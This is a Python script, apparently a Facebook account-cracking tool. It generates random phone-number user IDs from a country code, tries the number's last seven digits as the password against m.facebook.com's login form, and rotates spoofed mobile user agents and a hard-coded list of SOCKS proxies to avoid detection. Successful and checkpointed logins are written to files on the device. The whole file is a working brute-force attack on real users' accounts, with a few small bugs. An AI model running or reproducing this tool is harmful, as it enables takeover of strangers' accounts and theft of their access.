import os,requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,mechanize
from concurrent.futures import ThreadPoolExecutor as ThreadPool
agent=[]  
ugen=[]
for x in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
	if ugent1 in ugen:pass
	else:ugen.append(ugent1)
	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
	if ugent2 in ugen:pass
	else:ugen.append(ugent2)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
	if ugent3 in ugen:pass
	else:ugen.append(ugent3)
logo = """ """
loop = 0
oks = []
cps = []

def dynamic(text):
	titik = ['.   ','..  ','... ','.... ']
	for o in titik:
		print('\r'+text+o),
		sys.stdout.flush();time.sleep(1)
def main():
	os.system('clear')
	print(logo)
	print('\n [1] Random UID cloning')
	opt = input(' Select an option: ')
	if opt =='1':
		random_crack()
	else:
			print('\033[1;31mInvolved option!\033[1;31m')
def random_crack():
	opt = ('1')
	if opt =='1':
		random_number()
def random_number():
	user=[]
	os.system('clear')
	print(logo)
	print("92344 , 92345 etc")
	kode = input("ENTER COUNTY CODE : ")
	limit = int(input(' example: 1000, 2000, 5000, 10000\n put number limit: '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\n Total IDs: '+tl)
		print(' Process Has Been Started\n To Stop Process Press Ctrl + Z')
		print('--------------------------------------------------')
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	
def rcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	proxy_list = ['61.14.233.155:1080 ', '176.88.177.201:61080 ', '109.248.46.76:1080 ', '5.135.248.246:7497 ', '43.132.183.200:35366 ', '146.59.232.63:7497 ', '37.221.192.104:7497 ', '72.221.171.135:4145 ', '45.115.13.242:1080 ', '217.197.30.33:7497 ', '195.123.220.212:40031 ', '212.103.125.48:1080 ', '103.102.153.163:7497 ', '212.103.119.24:1080 ', '72.195.34.35:27360 ', '85.214.216.250:7497 ', '159.65.111.45:39465 ', '139.162.190.26:7497 ', '92.119.123.36:7497 ', '37.221.193.221:15803 ', '31.43.203.100:1080 ', '144.126.209.4:7497 ', '128.199.163.44:56760 ', '72.195.114.169:4145 ', '203.176.129.79:33427 ', '45.135.165.36:16379 ', '157.230.110.84:7497 ', '176.31.254.49:48540 ', '46.101.38.19:8080 ', '46.101.232.224:7497 ', '188.93.213.208:1080 ', '158.69.56.101:42316 ', '163.172.107.167:7497 ', '24.249.199.12:4145 ', '43.128.46.29:7497 ', '211.140.252.244:7300 ', '164.132.135.239:52750 ', '192.111.139.162:4145 ', '161.97.81.26:7497 ', '125.141.139.112:5566 ', '81.17.20.50:28557 ', '79.143.30.163:55418 ', '46.174.43.18:1080 ', '107.172.73.179:7890 ', '104.168.96.51:18134 ', '103.127.31.223:7497 ', '139.59.122.241:1080 ', '188.68.52.220:9050 ', '172.104.210.40:7497 ', '203.176.139.14:33427 ', '103.216.82.19:6667 ', '138.197.69.132:36465 ', '45.138.157.194:62524 ', '143.198.181.229:41985 ', '94.72.61.46:1080 ', '203.28.246.126:9050 ', '167.71.235.104:9999 ', '45.61.138.180:61442 ', '70.166.167.38:57728 ', '72.210.208.101:4145 ', '96.43.135.246:10012 ', '198.23.246.156:48079 ', '104.248.20.36:9050 ', '37.59.98.31:9050 ', '167.71.227.140:7497 ', '159.69.117.155:42572 ', '85.214.131.150:7497 ', '103.124.95.254:55338 ', '170.83.39.146:7497 ', '8.218.27.16:10705 ', '103.216.82.22:6667 ', '188.165.225.139:53386 ', '103.102.153.156:7497 ', '193.106.231.180:1080 ', '46.146.227.89:1080 ', '95.217.144.183:44965 ', '67.201.33.10:25283 ', '64.225.6.88:7497 ', '51.159.70.58:7497 ', '103.196.136.158:7497 ', '103.70.79.28:7497 ', '173.212.250.16:14711 ', '173.212.250.65:14411 ', '195.177.217.131:37006 ', '91.135.80.66:33427 ', '88.99.142.113:64806 ', '51.161.54.252:7497 ', '143.198.100.166:18921 ', '129.146.18.152:20000 ', '51.77.141.29:1080 ', '51.75.133.154:7497 ', '45.55.227.238:7497 ', '93.190.141.62:9050 ', '88.99.142.113:47097 ', '91.134.139.238:3080 ', '60.248.77.68:3000 ', '72.195.34.59:4145 ', '185.200.37.100:10820 ', '37.18.73.94:5566 ', '132.226.7.153:1080 ', '178.32.108.118:1080 ', '62.112.194.224:26057 ', '161.35.234.213:58000 ', '188.165.254.122:9420 ', '104.248.228.238:1080 ', '166.78.156.44:27428 ', '216.245.212.166:6448 ', '103.116.72.18:6666 ', '192.9.232.182:1080 ', '85.133.229.10:1080 ', '102.36.127.249:1080 ', '167.99.96.87:7497 ', '18.189.228.38:8000 ', '37.187.111.126:7497 ', '178.33.117.71:58460 ', '81.17.20.50:6735 ', '103.213.118.46:1080 ', '61.7.195.206:60198 ', '5.189.229.42:1080 ', '209.250.238.5:7497 ', '46.101.207.6:9050 ', '97.74.230.87:31365 ', '96.9.92.227:33427 ', '51.68.123.217:7497 ', '91.218.101.239:1080 ', '144.76.99.207:16008 ', '88.99.142.113:52256 ', '137.184.51.111:14175 ', '92.53.90.84:4131 ', '3.130.56.109:8000 ', '72.221.232.152:4145 ', '64.227.21.8:7497 ', '47.245.58.204:15001 ', '188.226.168.173:7497 ', '159.69.153.169:5566 ', '212.33.242.249:1080 ', '81.17.20.50:35034 ', '49.51.74.61:21127 ', '72.210.252.134:46164 ', '188.120.248.106:7497 ', '45.135.165.136:16379 ', '72.206.181.103:4145 ', '185.14.255.106:7497 ', '194.233.65.250:1080 ', '110.235.250.155:1080 ', '188.165.162.255:7497 ', '51.178.51.28:7497 ', '173.230.147.173:19527 ', '91.122.226.13:1080 ', '167.71.170.165:11104 ', '43.128.36.71:3389 ', '193.162.105.1:1080 ', '43.129.77.148:3001 ', '13.229.125.7:6666 ', '95.161.151.238:1080 ', '185.141.233.209:22475 ', '72.217.216.239:4145 ', '43.156.74.237:1080 ', '217.12.201.56:8085 ', '163.53.204.178:9813 ', '66.42.224.229:41679 ', '157.245.222.156:48473 ', '176.102.70.102:1080 ', '178.157.15.48:1080 ', '195.177.217.131:25309 ', '157.90.107.62:1081 ', '165.154.75.108:3512 ', '159.65.242.254:7497 ', '178.33.54.234:62231 ', '159.65.70.36:7497 ', '104.248.167.16:7497 ', '43.132.183.50:11111 ', '137.184.131.4:56559 ', '139.59.233.228:1080 ', '5.189.179.173:7497 ', '103.72.144.203:18899 ', '110.180.242.168:7302 ', '116.110.88.31:1080 ', '59.49.33.221:7302 ', '147.135.112.67:3080 ', '185.87.121.5:8975 ', '47.52.254.9:9100 ', '43.129.207.123:3001 ', '5.161.105.35:10200 ', '185.200.241.218:7497 ', '125.141.139.110:5566 ', '116.110.77.244:1080 ', '180.167.238.98:7302 ', '72.167.32.8:1080 ', '130.162.191.85:1080 ', '46.105.166.24:7497 ', '103.159.221.135:5678 ', '162.243.115.237:14521 ', '46.147.194.197:1080 ', '212.104.82.136:1080 ', '162.243.115.237:27192 ', '43.129.243.128:3001 ', '180.178.130.170:1080 ', '103.253.145.43:61461 ', '46.101.192.40:7497 ', '166.78.156.44:47372 ', '51.83.190.248:19050 ', '173.249.33.122:46431 ', '54.38.94.76:7497 ', '109.72.225.83:9100 ', '188.40.96.177:9050 ', '156.253.5.246:1080 ', '193.169.4.184:10801 ', '72.195.34.58:4145 ', '162.144.116.248:24610 ', '47.243.114.171:9090 ', '207.148.123.233:10800 ', '188.165.162.252:7497 ', '79.137.34.35:50665 ', '138.68.81.7:42725 ', '173.82.208.174:7497 ', '172.105.40.196:7497 ', '192.3.81.162:36123 ', '116.204.180.26:10129 ', '103.120.135.229:33427 ', '151.236.61.6:7497 ', '208.85.19.41:15218 ', '212.47.228.149:21449 ', '159.89.49.172:7497 ', '125.141.133.48:5566 ', '94.130.167.224:13314 ', '152.70.37.254:23456 ', '150.129.54.111:6667 ', '176.88.177.205:61080 ', '72.206.181.123:4145 ', '51.178.17.63:7497 ', '185.209.177.12:53466 ', '194.181.82.37:7497 ', '51.75.200.200:7497 ', '5.11.17.230:1080 ', '85.214.114.167:7497 ', '198.186.192.83:9050 ', '212.77.138.119:1080 ', '49.51.189.171:21127 ', '134.195.101.85:12611 ', '43.132.203.188:57890 ', '103.74.121.46:35612 ', '172.104.180.137:7497 ', '147.135.112.67:3081 ', '141.95.86.243:9050 ', '113.176.118.150:1080 ', '146.56.173.56:22738 ', '80.249.146.154:7497 ', '165.227.31.218:19090 ', '185.187.239.161:51080 ', '178.62.144.84:7497 ', '167.71.220.29:7497', '192.162.84.208:57']
	try:
		for ps in pwx:
			ua = random.choice(ugen)
			session = requests.Session()
			proxyX = {"http": "socks5://{random.choice(proxy_list)}"}
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'm.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': ua}
			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb,proxies=proxy).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\033[1;32m[OK] '+cid+' | '+ps)
				open('/sdcard/OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[CP] '+cid+' | '+ps)
				open('/sdcard/CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m %s/%s|\33[1;97mOK/CP:%s/%s'%(tl,loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass

main()